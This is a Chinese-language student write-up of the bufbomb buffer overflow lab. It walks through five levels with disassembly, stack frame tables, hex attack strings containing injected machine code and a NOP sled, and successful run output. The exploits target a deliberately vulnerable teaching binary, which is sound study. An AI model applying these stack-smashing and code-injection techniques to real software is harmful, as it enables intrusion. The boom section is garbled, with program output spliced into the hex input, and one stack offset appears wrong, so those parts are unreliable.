# Write-up

首先反汇编：

```shell
$ objdump -D bufbomb > bufbomb.s
```

获取自己的cookie：
```shell
$ ./makecookie U201814791 > cookie && cat cookie
0x675abfd7
```

## smoke

### 任务

构造一个攻击字符串作为`bufbomb`的输入，而在`getbuf()`中造成缓冲区溢出，使得`getbuf()`返回时不是返回到`test`函数继续执行，而是转向执行`smoke`。

### 题解

首先查看`bufbomb.c`中`smoke`的定义。`smoke`不接受参数，因此只需在`getbuf()`中输入构造的字符串，使得其返回地址指向`smoke`。

```c
void smoke()
{
    printf("Smoke!: You called smoke()\n");
    validate(0);
    exit(0);
}
```

然后分析`getbuf()`的栈帧。在`bufbomb.s`中定位到`getbuf`。可以看到其栈帧大小为`0x4（ebp旧值）+0x38=0x3c`。而`buf`缓冲区分配的大小为`0x28`，其起始地址为`0x55683848`。

```asm
080491ec <getbuf>:
 80491ec:	55                   	push   %ebp # ebp = 0x556838a0
 80491ed:	89 e5                	mov    %esp,%ebp # ebp = esp = 0x5568389c
 80491ef:	83 ec 38             	sub    $0x38,%esp # esp = 0x55683838
 80491f2:	8d 45 d8             	lea    -0x28(%ebp),%eax # buff, eax = 0x55683848
 80491f5:	89 04 24             	mov    %eax,(%esp)
 80491f8:	e8 55 fb ff ff       	call   8048d52 <Gets>
 80491fd:	b8 01 00 00 00       	mov    $0x1,%eax
 8049202:	c9                   	leave  
 8049203:	c3                   	ret    
```

| Addr      | Val         | Size |
| --------- | ----------- | ---- |
| +0x4      | return addr | 0x4  |
| +0x0 ebp  | old ebp     | 0x4  |
| -0x28     | buf         | 0x28 |
| -0x38 esp |             |      |

故需要构造长度为`0x28+0x4+0x4=0x30=48`的字符串，来覆盖`return addr`。最后四位为`smoke`的起始地址`0x08048c90`的小端存储形式。

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 /* 16 */
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 /* 32 */
00 00 00 00 00 00 00 00 00 00 00 00 90 8c 04 08 /* 48 */
```

### 结果

```shell
$ ./hex2raw < smoke.txt | ./bufbomb -u U201814791
Userid: U201814791
Cookie: 0x675abfd7
Type string:Smoke!: You called smoke()
VALID
NICE JOB!
```

## fizz

### 任务

你的任务是构造一个攻击字符串作为`bufbomb`的输入，在`getbuf()`中造成缓冲区溢出，使得本次`getbuf()`返回时不是返回到`test`函数继续执行，而是转向执行`fizz()`。

### 题解

首先查看`bufbomb.c`中`fizz`的定义。`fizz`接受一个`int`型参数`val`，并要求`val` 与`cookie`值相等。因此需在`getbuf()`中输入构造的字符串，使得其返回地址指向`smoke`，并且使得`cookie`的值正确传递。

```c
void fizz(int val)
{
    if (val == cookie) {
		printf("Fizz!: You called fizz(0x%x)\n", val);
		validate(1);

    } else
		printf("Misfire: You called fizz(0x%x)\n", val);
    exit(0);
}
```

在`bufbomb.s`中定位到`fizz`，分析其栈帧。`val`在栈上的地址是`0x8(%ebp)`。

```asm
08048cba <fizz>:
 8048cba:	55                   	push   %ebp
 8048cbb:	89 e5                	mov    %esp,%ebp
 8048cbd:	83 ec 18             	sub    $0x18,%esp
 8048cc0:	8b 45 08             	mov    0x8(%ebp),%eax
 8048cc3:	3b 05 20 c2 04 08    	cmp    0x804c220,%eax
```

考虑到调用`fizz`前`esp`指向`return addr`，故调用后`ebp`仍在原位。`fizz`和`getbuf`实际上共用了一个栈帧。

| Addr      | Val         | Size |
| --------- | ----------- | ---- |
| +0x12 |       parameter val       |0x4|
| +0x8 |       return addr in fizz       |0x4|
| +0x4      | return addr （old ebp in fizz） | 0x4  |
| +0x0 ebp  | old ebp     | 0x4  |
| -0x28     | buf         | 0x28 |
| -0x38 esp |             |      |

故需要构造长度为`0x28+0x4+0x4+0x4+0x4=0x38=56`的字符串，来覆盖`return addr`和`val`的传参。

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 16 */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 32 */
00 00 00 00 00 00 00 00 
00 00 00 00 ba 8c 04 08 /* 48 */
00 00 00 00 d7 bf 5a 67 /* 56 */
```

### 结果

```shell
$ ./hex2raw < fizz.txt | ./bufbomb -u U201814791
Userid: U201814791
Cookie: 0x675abfd7
Type string:Fizz!: You called fizz(0x675abfd7)
VALID
NICE JOB!
```

## bang

### 任务

本阶段的任务是设计包含攻击代码的攻击字符串，所含攻击代码首先将全局变量`global_value`设置为你的`cookie`值，然后转向执行`bang()`。

### 题解

首先查看`bufbomb.c`中`bang`的定义。`bang`接受一个`int`型参数`val`，但函数体内并没有使用`val` 。要求全局变量`global_value`与`cookie`值相等。因此需在`getbuf()`中输入构造字符串，其内容为一段自定义的指令，令`global_value=cookie`，并保证执行后跳转到`bang`。

```c
int global_value = 0;

void bang(int val)
{
    if (global_value == cookie) {
        printf("Bang!: You set global_value to 0x%x\n", global_value);
        validate(2);
    } else
        printf("Misfire: global_value = 0x%x\n", global_value);
    exit(0);
}
```

首先查看`bang`的地址，为`0x08048d05`：

```asm
08048d05 <bang>:
 8048d05:	55                   	push   %ebp
```

| Addr      | Val         | Size |
| --------- | ----------- | ---- |
| +0x4 | return addr (指向buf的起始地址) | 0x4  |
| +0x0 ebp  | old ebp     | 0x4  |
| -0x28     | buf         | 0x28 |
| -0x38 esp |             |      |

设计指令如下，其中`0x804c220`是`cookie`的地址，`0x804c218`是`global_value`的地址。使用`push`压入`bang`的返回地址，执行`ret`时`esp`恰好指向`bang`，实现了跳转。

```
a1 20 c2 04 08       	/* mov    0x804c220,%eax */
a3 18 c2 04 08       	/* mov    %eax,0x804c218 */
68 05 8d 04 08       	/* push   $0x8048d05 */
c3                   	/* ret */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 32 */
00 00 00 00 00 00 00 00 
00 00 00 00 48 38 68 55 /* 48 */
```

### 结果

```shell
$ ./hex2raw < bang.txt | ./bufbomb -u U201814791
Userid: U201814791
Cookie: 0x675abfd7
Type string:Bang!: You set global_value to 0x675abfd7
VALID
NICE JOB!
```

## boom

### 任务

本阶段的实验任务就是构造这样一个攻击字符串，使得`getbuf`函数不管获得什么输入，都能将正确的`cookie`值返回给`test`函数，而不是返回值`1`。除此之外,你的攻击代码应还原任何被破坏的状态，将正确返回地址压入栈中，并执行`ret`指令从而真正返回到`test`函数。

### 题解

首先查看`bufbomb.c`中`test`的定义。test调用`getbuf`给val赋值，并要求等于`cookie`。因此需在`getbuf()`中输入构造字符串，其内容为一段自定义的指令，令返回值等于`cookie`，并保证原有的`ebp`不变。

```c
void test()
{
    int val;
    /* Put canary on stack to detect possible corruption */
    volatile int local = uniqueval(); 

    val = getbuf(); 

    /* Check for corrupted stack */
    if (local != uniqueval()) {
		printf("Sabotaged!: the stack has been corrupted\n");
    }
    else if (val == cookie) {-
		printf("Boom!: getbuf returned 0x%x\n", val);
		validate(3);
    } else {
        printf("Dud: getbuf returned 0x%x\n", val);
    }
}
```

在`bufbomb.s`中定位到`test`，得到调用`getbuf`后的返回地址为`0x8048e81`。并要求`eax==cookie`。

```asm
08048e6d <test>:
 ...
 8048e7c:	e8 6b 03 00 00       	call   80491ec <getbuf>
 8048e81:	89 c3                	mov    %eax,%ebx
 ...
```

在`gdb`中调试，在调用`getbuf`前下断点。获取此时`ebp`的内容。

```shell
Breakpoint 5, 0x08048e7c in test ()
(gdb) i r ebp
ebp            0x556838a0          0x556838a0 <_reserved+1038496>
```

由`bang`的经验，很容易写出如下代码：

```asm
# return addr: 0x08048e81
# cookie addr: 0x0804c220
movl 0x0804c220, %eax
push $0x08048e81
ret
```

可以构造字符串输入如下。其中最后一行为相同的`ebp`以及`buf`起始地址。

```
a1 20 c2 04 08       	/* mov    0x804c220,%eax */
68 81 8e 04 08       	/* push   $0x8048e81 */
c3                   	/* ret    */
00 00 00 00 00          /* 16 */Userid: U201814791
Cookie: 0x675abfd7
Type string:Boom!: getbuf returned 0x675abfd7
VALID
NICE JOB!
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 32 */
00 00 00 00 00 00 00 00 /* 40 */
a0 38 68 55 48 38 68 55 /* 48 */
```

### 结果

```shell
$ ./hex2raw < boom.txt | ./bufbomb -u U201814791
Userid: U201814791
Cookie: 0x675abfd7
Type string:Boom!: getbuf returned 0x675abfd7
VALID
NICE JOB!
```

## nitro

### 任务

与阶段四类似，构造一攻击字符串使得`getbufn`函数（注，在`Nitro`阶段，`bufbomb`将调用`testn`函数和`getbufn`函数，见`bufbomb.c`）返回`cookie`值至`testn`函数，而不是返回值`1`。此时，需要将`cookie`值设为函数返回值，复原/清除所有被破坏的状态，并将正确的返回位置压入栈中，然后执行`ret`指令以正确地返回到`testn`函数。

与`boom`不同的是，本阶段的每次执行栈（`ebp`）均不同，所以你要想办法保证每次都能够正确复原栈被破坏的状态，以使得程序每次都能够正确返回到`testn`。

### 题解

定位到`testn`，观察到`old ebp = esp+0x24+0x4= esp+ 0x28`，且调用`getbufn`后的返回地址为`0x8048e15`。

```asm
08048e01 <testn>:
 8048e01:	55                   	push   %ebp
 8048e02:	89 e5                	mov    %esp,%ebp
 8048e04:	53                   	push   %ebx
 8048e05:	83 ec 24             	sub    $0x24,%esp
 8048e08:	e8 da ff ff ff       	call   8048de7 <uniqueval>
 8048e0d:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048e10:	e8 ef 03 00 00       	call   8049204 <getbufn>
 8048e15:	89 c3                	mov    %eax,%ebx
 ...
```

定位到`getbufn`，发现栈帧的大小发生了变化。此时栈帧大小为`0x218+0x4=0x21c`，`buf`相对于`ebp`的偏移为`-0x208`。故需要填充的字节为`0x208+0x4+0x4`。最后四个字节为返回地址。

```asm
08049204 <getbufn>:
 8049204:	55                   	push   %ebp
 8049205:	89 e5                	mov    %esp,%ebp
 8049207:	81 ec 18 02 00 00    	sub    $0x218,%esp
 804920d:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 8049213:	89 04 24             	mov    %eax,(%esp)
 8049216:	e8 37 fb ff ff       	call   8048d52 <Gets>
 804921b:	b8 01 00 00 00       	mov    $0x1,%eax
 8049220:	c9                   	leave  
 8049221:	c3                   	ret    
 8049222:	90                   	nop
 8049223:	90                   	nop
```

构造`getbufn`的输入字符串中应包含如下指令：

```asm
movl 0x0804c220, %eax
lea 0x28(%esp), %ebp # resotre ebp
push $0x8048e15
ret
```

然而，`nitro`模式下`getbufn`的栈帧并不是固定的，意味着不能用一个确定的值来表示每次执行`getbufn`时`buf`的地址。因而也就无法像`boom`中，直接通过使用`buf`的地址来覆盖返回地址，以实现执行构造的指令。

通过`gdb`调试，发现五次调用`getbufn`时，`buf`对应的值分别如下表所示，且每次运行时不变化。

|1|2|3|4|5|
|-|-|-|-|-|
|`0x55683668`| `0x55683688` | `0x55683698` | `0x556836b8` | `0x55683608` |

不妨令返回地址为最高的`0x556836b8`，令其余字节填充为汇编指令`nop`。当`buf`偏移地址低于`0x556836b8`时，总能执行`nop`，并重复执行直至执行上述的构造指令。

最终构造的输入如下：

```
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90-
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90          
/* 509 nop in total */

a1 20 c2 04 08       	/* mov    0x804c220,%eax */
8d 6c 24 28          	/* lea    0x28(%esp),%ebp */
68 15 8e 04 08       	/* push   $0x8048e15 */
c3                   	/* ret    */
b8 36 68 55           /* highest return addr */
```

### 结果

```shell
$ ./hex2raw -n < nitro.txt | ./bufbomb -n -u U201814791
Userid: U201814791
Cookie: 0x675abfd7
Type string:KABOOM!: getbufn returned 0x675abfd7
Keep going
Type string:KABOOM!: getbufn returned 0x675abfd7
Keep going
Type string:KABOOM!: getbufn returned 0x675abfd7
Keep going
Type string:KABOOM!: getbufn returned 0x675abfd7
Keep going
Type string:KABOOM!: getbufn returned 0x675abfd7
VALID
NICE JOB!
```